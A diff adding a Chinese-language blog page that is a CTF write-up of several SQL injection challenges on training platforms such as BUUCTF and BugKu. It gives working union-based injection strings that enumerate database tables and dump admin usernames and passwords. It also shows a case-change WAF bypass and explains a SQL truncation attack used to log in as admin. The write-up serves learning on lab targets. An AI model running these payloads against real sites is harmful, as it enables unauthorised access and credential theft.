@@ -1,0 +1,921 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"pocon041.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[NewStarCTF 2023 公开赛道]ez_sql 判断闭合方式为 ’（单引号） 爆字段数，以成功联合注入  ​    ?id&#x3D;1&#39; order by 1 --+">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF中SQL注入writeup">
+<meta property="og:url" content="https://pocon041.github.io/2024/11/11/SQLi/SQL%E6%B3%A8%E5%85%A5writeup/index.html">
+<meta property="og:site_name" content="Pocon">
+<meta property="og:description" content="[NewStarCTF 2023 公开赛道]ez_sql 判断闭合方式为 ’（单引号） 爆字段数，以成功联合注入  ​    ?id&#x3D;1&#39; order by 1 --+">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-1.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-2.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-3.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-4.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-5.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-6.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-7.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-1.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-2.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-3.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-4.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-5.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-6.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-7.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-8.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241115233313019.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241115233348097.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241115233653921.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241115235406854.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116000616003.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116000703445.png">
+<meta property="og:image" content="c:/Users/czh/AppData/Roaming/Typora/typora-user-images/image-20250307181637345.png">
+<meta property="og:image" content="c:/Users/czh/AppData/Roaming/Typora/typora-user-images/image-20250307181606149.png">
+<meta property="og:image" content="c:/Users/czh/AppData/Roaming/Typora/typora-user-images/image-20250307182041961.png">
+<meta property="article:published_time" content="2024-11-11T12:06:49.000Z">
+<meta property="article:modified_time" content="2024-11-11T12:06:49.000Z">
+<meta property="article:author" content="Pocon">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-1.png">
+
+<link rel="canonical" href="https://pocon041.github.io/2024/11/11/SQLi/SQL%E6%B3%A8%E5%85%A5writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>BUUCTF中SQL注入writeup | Pocon</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --></head>
+
+<body class=" post-shell" itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Pocon</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-blog">
+
+    <a href="/blog/" rel="section"><i class="fa fa-pencil-alt fa-fw"></i>Blog</a>
+
+  </li>
+        <li class="menu-item menu-item-projects">
+
+    <a href="/#projects" rel="section"><i class="fa fa-code fa-fw"></i>Projects</a>
+
+  </li>
+        <li class="menu-item menu-item-music">
+
+    <a href="/music/" rel="section"><i class="fa fa-music fa-fw"></i>Music</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+  <nav class="post-topbar" aria-label="Post navigation">
+  <a class="post-brand" href="/">Pocon</a>
+  <div>
+    <a href="/">Home</a>
+    <a href="/about/">About</a>
+    <a href="/blog/">Blog</a>
+    <a href="/archives/">Archive</a>
+    <a href="/categories/">Categories</a>
+    <a href="/tags/">Tags</a>
+    <a href="/gallery/">Gallery</a>
+    <a href="/music/">Music</a>
+  </div>
+</nav>
+
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block has-post-cover" style="--post-cover-image: url('/images/post-covers/77150895_p0.jpg'); --post-cover-overlay: linear-gradient(90deg, rgba(255, 255, 255, 0.86) 0%, rgba(255, 255, 255, 0.74) 52%, rgba(255, 255, 255, 0.58) 100%); --post-cover-position: center; --post-cover-size: cover; --post-cover-repeat: no-repeat; --post-cover-blend-mode: normal" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://pocon041.github.io/2024/11/11/SQLi/SQL%E6%B3%A8%E5%85%A5writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Pocon">
+      <meta itemprop="description" content="Pocon's personal blog about Computer Vision, CTF, Multimedia Forensics, Web Security, Pwn and Machine Learning.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pocon">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          BUUCTF中SQL注入writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-11-11 20:06:49" itemprop="dateCreated datePublished" datetime="2024-11-11T20:06:49+08:00">2024-11-11</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="NewStarCTF-2023-公开赛道-ez-sql"><a href="#NewStarCTF-2023-公开赛道-ez-sql" class="headerlink" title="[NewStarCTF 2023 公开赛道]ez_sql"></a>[NewStarCTF 2023 公开赛道]ez_sql</h2><ol>
+<li><h5 id="判断闭合方式为-’（单引号）"><a href="#判断闭合方式为-’（单引号）" class="headerlink" title="判断闭合方式为 ’（单引号）"></a>判断闭合方式为 <code>’</code>（单引号）</h5></li>
+<li><h5 id="爆字段数，以成功联合注入"><a href="#爆字段数，以成功联合注入" class="headerlink" title="爆字段数，以成功联合注入"></a>爆字段数，以成功联合注入</h5></li>
+</ol>
+<p>​    <code>?id=1' order by 1 --+</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-1.png" alt="1-1"></p>
+<p>​    发现有WAF，这里使用大写绕过</p>
+<p>​    <code>?id=1' Order by 1 --+</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-2.png" alt="1-2"></p>
+<p>​    一直尝试直到<code>?id=1' Order by 6 --+</code>没有回显，说明字段数为5</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-3.png" alt="1-3"></p>
+<ol>
+<li><h5 id="联合注入爆数据库名"><a href="#联合注入爆数据库名" class="headerlink" title="联合注入爆数据库名"></a>联合注入爆数据库名</h5></li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-4.png" alt="1-4"></p>
+<p>​    可见，数据库名就是ctf</p>
+<p>​    到这里答案就是到手的鸭子了</p>
+<ol>
+<li><h5 id="顺藤摸瓜，找到表名"><a href="#顺藤摸瓜，找到表名" class="headerlink" title="顺藤摸瓜，找到表名"></a>顺藤摸瓜，找到表名</h5></li>
+</ol>
+<p><code>?id=1' UNION SELECT 1,2,3,4,GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA ='ctf' --+</code></p>
+<p>​    <img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-5.png" alt="1-5"></p>
+<p>​    显然flag在here_is_flag这个表中，但我们先要找到在哪个字段下（当然一般可以直接猜出来字段名为flag）</p>
+<ol>
+<li><h5 id="再找到字段名"><a href="#再找到字段名" class="headerlink" title="再找到字段名"></a>再找到字段名</h5></li>
+</ol>
+<p>​    <code>?id=1' UNION SELECT 1,2,3,4,GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME ='here_is_flag' --+</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-6.png" alt="1-6"></p>
+<ol>
+<li><h5 id="查询字段值"><a href="#查询字段值" class="headerlink" title="查询字段值"></a>查询字段值</h5></li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-7.png" alt="1-7"></p>
+<p>​    大功告成</p>
+<hr>
+<h2 id="BUU-SQL-COURSE-1"><a href="#BUU-SQL-COURSE-1" class="headerlink" title="BUU SQL COURSE 1"></a>BUU SQL COURSE 1</h2><p>点进去发现有两个模块，一个新闻页面，一个登录页面。</p>
+<ol>
+<li><h5 id="找到注入位置"><a href="#找到注入位置" class="headerlink" title="找到注入位置"></a>找到注入位置</h5></li>
+</ol>
+<p>点开热点中的热点一，发现这里有一个php请求，猜测是否这里有sql注入（为什么呢）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-1.png" alt="2-1"></p>
+<ol>
+<li><h5 id="开始注入（公式化）"><a href="#开始注入（公式化）" class="headerlink" title="开始注入（公式化）"></a>开始注入（公式化）</h5></li>
+</ol>
+<p>爆字段数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-2.png" alt="2-2"></p>
+<p>爆库名</p>
+<p><code>?id=-1 union select 1,database() --+</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-3.png" alt="2-3"></p>
+<p>爆表名</p>
+<p><code>?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='news' --+</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-4.png" alt="2-4"></p>
+<p>爆字段名</p>
+<p><code>?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='admin' --+</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-5.png" alt="2-5"></p>
+<p>爆字段值</p>
+<p><code>?id=-1 union select 1,group_concat(username,',',password) from news.admin --+</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-6.png" alt="2-6"></p>
+<p>得到账号密码后就去登录吧</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-7.png" alt="2-7"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-8.png" alt="2-8"></p>
+<p>完结撒花<em>★,°</em>:.☆(￣▽￣)/$:<em>.°★</em> 。</p>
+<hr>
+<h2 id="CTF-BugKu-sqli-0x1"><a href="#CTF-BugKu-sqli-0x1" class="headerlink" title="CTF-BugKu-sqli-0x1"></a>CTF-BugKu-sqli-0x1</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_73625393/article/details/137773172">https://blog.csdn.net/weixin_73625393/article/details/137773172</a></p>
+<p><a target="_blank" rel="noopener" href="http://danielw.top/index.php/daniel/340/">http://danielw.top/index.php/daniel/340/</a></p>
+<p>没有变化，使用的是POST传参</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241115233313019.png" alt="image-20241115233313019"></p>
+<p>打开源代码看看</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241115233348097.png" alt="image-20241115233348097"></p>
+<p>发现有提示。查看这个php文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241115233653921.png" alt="image-20241115233653921"></p>
+<p>待水平进步再来做这个qaq</p>
+<h2 id="CTF-BugKu-login1"><a href="#CTF-BugKu-login1" class="headerlink" title="CTF-BugKu-login1"></a>CTF-BugKu-login1</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lga0325/article/details/143353230">https://blog.csdn.net/lga0325/article/details/143353230</a></p>
+<p>在登录密码是，账号默认为admin，输入各种万能密码都没用</p>
+<p>查看注册页面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241115235406854.png" alt="image-20241115235406854"></p>
+<p>发现admin已经存在了</p>
+<p>这个时候考虑SQL约束攻击</p>
+<p>在注册用户时，因为 insert 插入数据受到数据库定义的长度限制，会自动将超出长度的数据截断。因此，如果 uname 的长度限制为 char(7)，那么注册账号<code>'admin a'</code>时，由于长度超出，则后面的 <code>a</code> 会被截断，此时，数据库存储数据会把空格删除，在数据库内就变成了<code>admin</code>        （？怎么会有七个字符？）</p>
+<p>此时登录时使用 admin 和自己注册的密码登录，数据库返回注册时的账号信息，但是如果业务侧仅根据返回的用户名信息判断权限，则会导致水平越权的漏洞</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116000616003.png" alt="image-20241116000616003"></p>
+<p>注册成功，注意用户名这里有一个空格</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116000703445.png" alt="image-20241116000703445"></p>
+<p>直接使用admin身份登录得到flag</p>
+<h2 id="SWPUCTF-2024-秋季新生赛-ez-sql"><a href="#SWPUCTF-2024-秋季新生赛-ez-sql" class="headerlink" title="[SWPUCTF 2024 秋季新生赛]ez_sql"></a>[SWPUCTF 2024 秋季新生赛]ez_sql</h2><p>判断为字符型</p>
+<p><img src="C:/Users/czh/AppData/Roaming/Typora/typora-user-images/image-20250307181637345.png" alt="image-20250307181637345"></p>
+<p>他将输入内容转化为十六进制ASCII码，所以直接通过hackerbar修改url的话需要进一步转化一下。所以为了方便直接再textbox里注入</p>
+<p><img src="C:/Users/czh/AppData/Roaming/Typora/typora-user-images/image-20250307181606149.png" alt="image-20250307181606149"></p>
+<p>这里发现有报错回显，所以可以使用联合注入。但是这时发现有典型的闭合方式错误。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cyynid/article/details/128630181">https://blog.csdn.net/cyynid/article/details/128630181</a></p>
+<p>最后得出是 # 闭合</p>
+<p>1’ order by 5# —+</p>
+<p>1’ union select 1,2,3,4;# —+</p>
+<p><img src="C:/Users/czh/AppData/Roaming/Typora/typora-user-images/image-20250307182041961.png" alt="image-20250307182041961"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/11/09/SQLi/sql-lab/" rel="prev" title="sqli-lab（一）">
+      <i class="fa fa-chevron-left"></i> sqli-lab（一）
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/" rel="next" title="BUUCTF中SQL注入writeup">
+      BUUCTF中SQL注入writeup <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      document.querySelectorAll('.post-shell .post-body p').forEach(paragraph => {
+        if (paragraph.textContent.trim().toLowerCase() === '[toc]') {
+          paragraph.remove();
+        }
+      });
+
+      const copyText = async text => {
+        if (navigator.clipboard && window.isSecureContext) {
+          await navigator.clipboard.writeText(text);
+          return true;
+        }
+        const textarea = document.createElement('textarea');
+        textarea.value = text;
+        textarea.setAttribute('readonly', '');
+        textarea.style.position = 'fixed';
+        textarea.style.top = '-9999px';
+        document.body.appendChild(textarea);
+        textarea.select();
+        const result = document.execCommand('copy');
+        textarea.remove();
+        return result;
+      };
+
+      document.querySelectorAll('.post-shell .post-body figure.highlight, .post-shell .post-body > pre:not(.mermaid)').forEach(block => {
+        if (block.querySelector('.post-code-copy')) return;
+        block.classList.add('post-code-copyable');
+        const button = document.createElement('button');
+        button.type = 'button';
+        button.className = 'post-code-copy';
+        button.textContent = 'Copy';
+        button.addEventListener('click', async () => {
+          const codeElement = block.matches('figure.highlight') ? block.querySelector('.code') : block;
+          const code = (codeElement ? codeElement.innerText : '').replace(/\n$/, '');
+          try {
+            await copyText(code);
+            button.textContent = 'Copied';
+            window.setTimeout(() => {
+              button.textContent = 'Copy';
+            }, 1200);
+          } catch (error) {
+            button.textContent = 'Failed';
+            window.setTimeout(() => {
+              button.textContent = 'Copy';
+            }, 1200);
+          }
+        });
+        block.appendChild(button);
+      });
+
+      const viewer = document.createElement('div');
+      viewer.className = 'post-image-viewer';
+      viewer.innerHTML = '<button type="button" class="post-image-viewer-close">Close</button><img alt="">';
+      document.body.appendChild(viewer);
+      const viewerImage = viewer.querySelector('img');
+      const viewerState = {
+        scale: 1,
+        x: 0,
+        y: 0,
+        minScale: 1,
+        maxScale: 6,
+        isDragging: false,
+        isPinching: false,
+        startX: 0,
+        startY: 0,
+        originX: 0,
+        originY: 0,
+        touchDistance: 0,
+        touchScale: 1,
+        touchCenterX: 0,
+        touchCenterY: 0
+      };
+      const clampViewerScale = scale => Math.min(viewerState.maxScale, Math.max(viewerState.minScale, scale));
+      const applyViewerTransform = () => {
+        viewerImage.style.setProperty('--viewer-scale', viewerState.scale);
+        viewerImage.style.setProperty('--viewer-x', `${viewerState.x}px`);
+        viewerImage.style.setProperty('--viewer-y', `${viewerState.y}px`);
+      };
+      const resetViewerState = () => {
+        viewerState.scale = 1;
+        viewerState.x = 0;
+        viewerState.y = 0;
+        viewerState.isDragging = false;
+        viewerState.isPinching = false;
+        viewerState.touchDistance = 0;
+        viewerState.touchScale = 1;
+        viewerState.touchCenterX = 0;
+        viewerState.touchCenterY = 0;
+        viewer.classList.remove('is-dragging');
+        applyViewerTransform();
+      };
+      const zoomViewerAt = (clientX, clientY, nextScale) => {
+        const oldScale = viewerState.scale;
+        const scale = clampViewerScale(nextScale);
+        if (scale === oldScale) return;
+
+        const rect = viewerImage.getBoundingClientRect();
+        const centerX = rect.left + rect.width / 2;
+        const centerY = rect.top + rect.height / 2;
+        const ratio = scale / oldScale;
+        viewerState.x -= (clientX - centerX) * (ratio - 1);
+        viewerState.y -= (clientY - centerY) * (ratio - 1);
+        viewerState.scale = scale;
+
+        if (viewerState.scale === 1) {
+          viewerState.x = 0;
+          viewerState.y = 0;
+        }
+        applyViewerTransform();
+      };
+      const closeViewer = () => {
+        viewer.classList.remove('is-active', 'is-dragging');
+        document.documentElement.classList.remove('post-image-viewer-open');
+        resetViewerState();
+      };
+      const openViewer = image => {
+        resetViewerState();
+        viewerImage.src = image.currentSrc || image.src;
+        viewerImage.alt = image.alt || '';
+        viewer.classList.add('is-active');
+        document.documentElement.classList.add('post-image-viewer-open');
+      };
+      const touchDistance = touches => Math.hypot(
+        touches[0].clientX - touches[1].clientX,
+        touches[0].clientY - touches[1].clientY
+      );
+      const touchCenter = touches => ({
+        x: (touches[0].clientX + touches[1].clientX) / 2,
+        y: (touches[0].clientY + touches[1].clientY) / 2
+      });
+
+      document.querySelectorAll('.post-shell .post-body img').forEach(image => {
+        image.tabIndex = 0;
+        image.addEventListener('click', event => {
+          event.preventDefault();
+          openViewer(image);
+        });
+        image.addEventListener('keydown', event => {
+          if (event.key === 'Enter') {
+            image.click();
+          }
+        });
+      });
+
+      viewer.addEventListener('wheel', event => {
+        if (!viewer.classList.contains('is-active')) return;
+        event.preventDefault();
+        const factor = event.deltaY < 0 ? 1.14 : 0.88;
+        zoomViewerAt(event.clientX, event.clientY, viewerState.scale * factor);
+      }, { passive: false });
+
+      viewerImage.addEventListener('dblclick', event => {
+        event.preventDefault();
+        resetViewerState();
+      });
+
+      viewerImage.addEventListener('pointerdown', event => {
+        if (!viewer.classList.contains('is-active') || event.button > 0 || viewerState.isPinching) return;
+        if (event.pointerType === 'touch' && event.isPrimary === false) return;
+        event.preventDefault();
+        viewerState.isDragging = true;
+        viewerState.startX = event.clientX;
+        viewerState.startY = event.clientY;
+        viewerState.originX = viewerState.x;
+        viewerState.originY = viewerState.y;
+        viewer.classList.add('is-dragging');
+        viewerImage.setPointerCapture(event.pointerId);
+      });
+
+      viewerImage.addEventListener('pointermove', event => {
+        if (!viewerState.isDragging || viewerState.isPinching) return;
+        viewerState.x = viewerState.originX + event.clientX - viewerState.startX;
+        viewerState.y = viewerState.originY + event.clientY - viewerState.startY;
+        applyViewerTransform();
+      });
+
+      const stopViewerDrag = event => {
+        if (!viewerState.isDragging) return;
+        viewerState.isDragging = false;
+        viewer.classList.remove('is-dragging');
+        if (event && viewerImage.hasPointerCapture(event.pointerId)) {
+          viewerImage.releasePointerCapture(event.pointerId);
+        }
+      };
+      viewerImage.addEventListener('pointerup', stopViewerDrag);
+      viewerImage.addEventListener('pointercancel', stopViewerDrag);
+
+      viewerImage.addEventListener('touchstart', event => {
+        if (event.touches.length !== 2) return;
+        event.preventDefault();
+        const center = touchCenter(event.touches);
+        viewerState.isPinching = true;
+        viewerState.isDragging = false;
+        viewerState.touchDistance = touchDistance(event.touches);
+        viewerState.touchScale = viewerState.scale;
+        viewerState.touchCenterX = center.x;
+        viewerState.touchCenterY = center.y;
+        viewer.classList.remove('is-dragging');
+      }, { passive: false });
+
+      viewerImage.addEventListener('touchmove', event => {
+        if (event.touches.length !== 2 || !viewerState.touchDistance) return;
+        event.preventDefault();
+        const center = touchCenter(event.touches);
+        viewerState.x += center.x - viewerState.touchCenterX;
+        viewerState.y += center.y - viewerState.touchCenterY;
+        viewerState.touchCenterX = center.x;
+        viewerState.touchCenterY = center.y;
+        applyViewerTransform();
+        const nextScale = viewerState.touchScale * (touchDistance(event.touches) / viewerState.touchDistance);
+        zoomViewerAt(center.x, center.y, nextScale);
+      }, { passive: false });
+
+      viewerImage.addEventListener('touchend', () => {
+        viewerState.isPinching = false;
+        viewerState.touchDistance = 0;
+        viewerState.touchScale = viewerState.scale;
+        viewerState.touchCenterX = 0;
+        viewerState.touchCenterY = 0;
+      });
+
+      viewerImage.addEventListener('touchcancel', () => {
+        viewerState.isPinching = false;
+        viewerState.touchDistance = 0;
+        viewerState.touchScale = viewerState.scale;
+        viewerState.touchCenterX = 0;
+        viewerState.touchCenterY = 0;
+      });
+
+      viewer.addEventListener('click', event => {
+        if (event.target === viewer || event.target.classList.contains('post-image-viewer-close')) {
+          closeViewer();
+        }
+      });
+      window.addEventListener('keyup', event => {
+        if (event.key === 'Escape') {
+          closeViewer();
+        }
+      });
+    });
+  </script>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
